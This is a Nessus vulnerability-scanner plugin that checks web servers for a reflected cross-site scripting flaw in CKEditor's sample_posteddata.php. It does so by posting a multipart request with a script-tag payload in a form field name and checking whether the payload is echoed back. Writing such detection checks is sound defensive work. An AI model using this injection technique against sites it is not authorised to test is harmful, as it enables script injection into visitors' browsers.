#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(65720);
  script_version("$Revision: 1.5 $");
  script_cvs_date("$Date: 2015/09/24 21:08:38 $");

  script_bugtraq_id(58045);
  script_xref(name:"EDB-ID", value:"24530");

  script_name(english:"CKEditor sample_posteddata.php XSS");
  script_summary(english:"Attempts a non-persistent XSS");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server hosts a PHP script that is affected by a cross-
site scripting vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of the CKEditor installed on the remote host is affected by
a cross-site scripting vulnerability because it fails to properly
sanitize user-supplied input to the 'sample_posteddata.php' script.  An
unauthenticated, remote attacker may be able to leverage this to inject
arbitrary HTML and script code into a user's browser to be executed
within the security context of the affected site. 

Note that this version is reportedly also affected by a cross-site
request forgery (CSRF) vulnerability as well as a path disclosure issue. 
However, Nessus did not test for these additional issues."
  );
  # http://packetstormsecurity.com/files/120387/CKEditor-4.0.1-CSRF-XSS-Path-Disclosure.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?160b629e");
  script_set_attribute(attribute:"see_also", value:"http://ckeditor.com/blog/CKEditor-4.0.1.1-Released");
  script_set_attribute(attribute:"solution", value:"Upgrade to version 4.0.1.1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/02/19");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/02/20");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/03/28");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:ckeditor:ckeditor");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2013-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80, php:TRUE);

if (thorough_tests) dirs = list_uniq(
  make_list(
    "/ckeditor",
    "/modules/ckeditor",
    "/admin/ckeditor",
    "/includes/ckeditor",
    "/lib/ckeditor",
    cgi_dirs()
  )
);
else dirs = make_list(cgi_dirs());

install_dirs = make_list();
non_vuln = make_list();
foreach dir (dirs)
{
  # check that sample_posteddata.php exists
  res = http_send_recv3(
    method : "GET",
    port   : port,
    item   : dir + "/samples/sample_posteddata.php",
    exit_on_fail : TRUE
  );

  if (
    "<title>Sample &mdash; CKEditor</title>" >< res[2] &&
    "CKEditor &mdash; Posted Data" >< res[2]
  ) install_dirs = make_list(install_dirs, dir);
}

if (max_index(install_dirs) == 0)
  exit(0, "The sample_posteddata.php script for CKEditor was not located on the web server on port " + port + ".");

# Only call these once
script = SCRIPT_NAME - ".nasl";
time = unixtime();

foreach dir (install_dirs)
{
  payload = "<script>alert('" + script + "-" + time + "');<script>";

  xss_attack = '-----------------------------253112480323116\r\n' +
    'Content-Disposition: form-data; name="' + payload + '"\r\n' + '\r\n' +
    '\r\n' + 'Nessus - ' + time + '\r\n' +
    '-----------------------------253112480323116\r\n';

  res2 = http_send_recv3(
    method    : "POST",
    item      : dir + "/samples/sample_posteddata.php",
    data      : xss_attack,
    add_headers:
      make_array("Content-Type",
    "multipart/form-data; boundary=---------------------------253112480323116"),
    port         : port,
    exit_on_fail : TRUE
  );

  exp_request = http_last_sent_request();
  pass_str = 'style="vertical-align: top">' + payload;
  vuln = FALSE;

  if (
    pass_str >< res2[2] &&
    "Nessus - " + time + "</pre>" >< res2[2]
  )
  {
    vuln = TRUE;
    set_kb_item(name:'www/'+port+'/XSS', value:TRUE);
    output = extract_pattern_from_resp(string:res2[2], pattern:'ST:'+pass_str);

    if (report_verbosity > 0)
    {
      report =
        '\nNessus was able to verify the issue using the following request :' +
        '\n' +
        '\n' + exp_request +
        '\n';
      if (report_verbosity > 1)
      {
        report +=
          '\nThis produced the following response :' +
          '\n' +
          '\n' + output +
          '\n';
      }
      security_warning(port:port, extra:report);
    }
    else security_warning(port);
  }
  if (!vuln) non_vuln = make_list(non_vuln, build_url(qs:dir, port:port));
  if (!thorough_tests && vuln) break;
}

# Audit Trails
installs = max_index(non_vuln);
if (installs > 0)
{
  if (installs == 1)
    audit(AUDIT_WEB_APP_NOT_AFFECTED, "CKEditor", non_vuln[0]);
  else exit(0, "The CKEditor installs at " + join(non_vuln, sep:", ") +
    " are not affected.");
}
